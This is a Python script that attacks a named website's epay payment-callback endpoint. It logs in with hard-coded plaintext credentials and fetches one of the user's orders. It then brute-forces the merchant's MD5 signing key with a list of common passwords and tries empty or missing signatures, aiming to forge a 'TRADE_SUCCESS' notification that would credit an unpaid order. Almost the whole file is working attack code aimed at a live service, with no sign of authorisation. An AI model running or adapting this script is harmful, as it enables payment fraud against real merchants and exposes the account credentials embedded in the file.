#!/usr/bin/env python3
import requests
import hashlib
import time

BASE_URL = "https://timyai.com"
TEST_USERNAME = "antplayer"
TEST_PASSWORD = "sjh@101709"
REAL_TRADE_NO = "USR20NO5FFXID1777806504"

def test_login():
    print("\n[步骤1] 登录...")
    data = {"username": TEST_USERNAME, "password": TEST_PASSWORD}
    try:
        resp = requests.post(BASE_URL + "/api/user/login", json=data, timeout=10)
        result = resp.json()
        if result.get("success"):
            session = resp.cookies.get("session")
            user_id = result.get("data", {}).get("id")
            print(f"✅ 登录成功 - 用户ID: {user_id}")
            return user_id, session
    except Exception as e:
        print(f"❌ 失败: {e}")
    return None, None

def get_order_info(user_id, session):
    print("\n[步骤2] 获取订单信息...")
    cookies = {"session": session}
    headers = {"New-Api-User": str(user_id), "Content-Type": "application/json"}
    
    try:
        resp = requests.get(BASE_URL + "/api/user/topup/self", 
                          cookies=cookies, headers=headers, timeout=10)
        result = resp.json()
        
        if result.get("success"):
            for item in result.get("data", {}).get("items", []):
                if item.get('trade_no') == REAL_TRADE_NO:
                    print(f"✅ 找到订单: {item}")
                    return item
    except Exception as e:
        print(f"❌ 失败: {e}")
    return None

def test_signature_schemes(order_info):
    print("\n[步骤3] 测试不同签名策略...")
    
    base_params = {
        "pid": "1378",
        "out_trade_no": order_info.get('trade_no'),
        "trade_status": "TRADE_SUCCESS",
        "trade_fee": str(order_info.get('money')),
        "type": order_info.get('payment_method'),
        "time": str(order_info.get('create_time')),
    }
    
    common_keys = [
        "test", "123456", "key", "secret", "password",
        "epay", "1378", "timyai", "zhunfu", "pay",
        "testkey", "123456789", "admin", "admin123",
    ]
    
    schemes = [
        ("md5_param_key", lambda p, k: generate_md5(p, k, "param")),
        ("md5_key_param", lambda p, k: generate_md5(p, k, "key")),
        ("md5_param", lambda p, k: generate_md5(p, k, None)),
    ]
    
    url = BASE_URL + "/api/user/epay/notify"
    
    print(f"\n测试 {len(common_keys)} 个密钥 × {len(schemes)} 种格式...")
    
    for key in common_keys:
        for scheme_name, scheme_func in schemes:
            sign = scheme_func(base_params.copy(), key)
            
            test_params = base_params.copy()
            test_params['sign'] = sign
            
            try:
                resp = requests.post(url, data=test_params, timeout=5)
                
                if resp.text == "success":
                    print(f"\n✅✅✅ 成功! 方案: {scheme_name}, 密钥: {key}")
                    print(f"   签名: {sign}")
                    print(f"   响应: {resp.text}")
                    return True, key, scheme_name, sign
                    
            except Exception as e:
                continue
    
    print(f"\n❌ 未找到有效签名方案")
    return False, None, None, None

def generate_md5(params, key, format_type):
    """生成MD5签名"""
    sorted_params = sorted([(k, v) for k, v in params.items()])
    param_str = "&".join([f"{k}={v}" for k, v in sorted_params])
    
    if format_type == "param_key":
        sign_str = f"{param_str}&key={key}"
    elif format_type == "key_param":
        sign_str = f"key={key}&{param_str}"
    else:
        sign_str = param_str + key
    
    return hashlib.md5(sign_str.encode()).hexdigest()

def test_special_cases(order_info):
    print("\n[步骤4] 测试特殊签名...")
    
    base_params = {
        "pid": "1378",
        "out_trade_no": order_info.get('trade_no'),
        "trade_status": "TRADE_SUCCESS",
        "trade_fee": str(order_info.get('money')),
        "type": order_info.get('payment_method'),
        "time": str(order_info.get('create_time')),
    }
    
    url = BASE_URL + "/api/user/epay/notify"
    
    special_tests = [
        ("空sign", {"sign": ""}),
        ("无sign参数", {}),
        ("sign=1", {"sign": "1"}),
        ("sign=success", {"sign": "success"}),
        ("sign_md5_empty", {"sign": hashlib.md5(b"").hexdigest()}),
    ]
    
    for desc, override in special_tests:
        test_params = base_params.copy()
        test_params.update(override)
        
        try:
            resp = requests.post(url, data=test_params, timeout=5)
            result = "✅ 安全" if resp.text == "fail" else f"⚠️ {resp.text}"
            print(f"  {desc}: {result}")
            
            if resp.text == "success":
                print(f"  ⚠️  ⚠️  ⚠️  可能存在漏洞! ⚠️  ⚠️  ⚠️")
                return True
        except:
            pass
    
    return False

def main():
    print("="*60)
    print("timyai.com 签名破解测试")
    print("="*60)
    
    user_id, session = test_login()
    if not user_id:
        return
    
    order = get_order_info(user_id, session)
    if not order:
        return
    
    success, key, scheme, sign = test_signature_schemes(order)
    
    if not success:
        test_special_cases(order)
    
    print("\n" + "="*60)
    print("测试完成")
    print("="*60)

if __name__ == "__main__":
    main()
